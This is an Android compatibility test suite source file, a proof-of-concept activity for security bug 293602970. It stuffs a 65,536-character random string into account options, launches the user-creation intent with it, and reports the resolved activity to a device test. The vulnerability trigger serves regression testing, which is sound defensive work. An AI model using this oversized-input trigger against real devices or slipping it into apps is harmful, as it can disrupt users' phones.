/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.BUG_293602970;

import static android.os.UserManager.createUserCreationIntent;

import android.app.Activity;
import android.content.Intent;
import android.os.PersistableBundle;

import java.util.Random;

public class PocActivity extends Activity {

    @Override
    public void onResume() {
        try {
            super.onResume();

            // Create instance of 'PersistableBundle' to pass as an argument to
            // 'createUserCreationIntent()'
            PersistableBundle accountOptions = new PersistableBundle();
            accountOptions.putString(
                    "key",
                    new Random()
                            .ints('A' /* randomNumberOrigin */, 'Z' + 1 /* randomNumberBound */)
                            .limit(65536 /* maxSize */)
                            .collect(
                                    StringBuilder::new /* supplier */,
                                    StringBuilder::appendCodePoint /* accumulator */,
                                    StringBuilder::append /* combiner */)
                            .toString());

            // Launch activity to reproduce vulnerability
            // User creation intent must be launched with 'startActivityForResult'
            final Intent createUserCreationIntent =
                    createUserCreationIntent(
                            "BUG_293602970_user" /* userName */,
                            "BUG_293602970_account" /* accountName */,
                            "BUG_293602970_account_type" /* accountType */,
                            accountOptions /* accountOptions */);

            startActivityForResult(createUserCreationIntent, 1 /* requestCode */);

            // Send broadcast to 'DeviceTest' along with activity name resolving to
            // user creation intent as a string extra
            final String activityName =
                    createUserCreationIntent.resolveActivity(getPackageManager()).flattenToString();
            sendBroadcast(
                    new Intent("BUG_293602970_action")
                            .setPackage(getPackageName())
                            .putExtra("activityName", activityName));
        } catch (Exception ignore) {
            // Ignore exceptions here. These would be caught in DeviceTest.
        }
    }
}
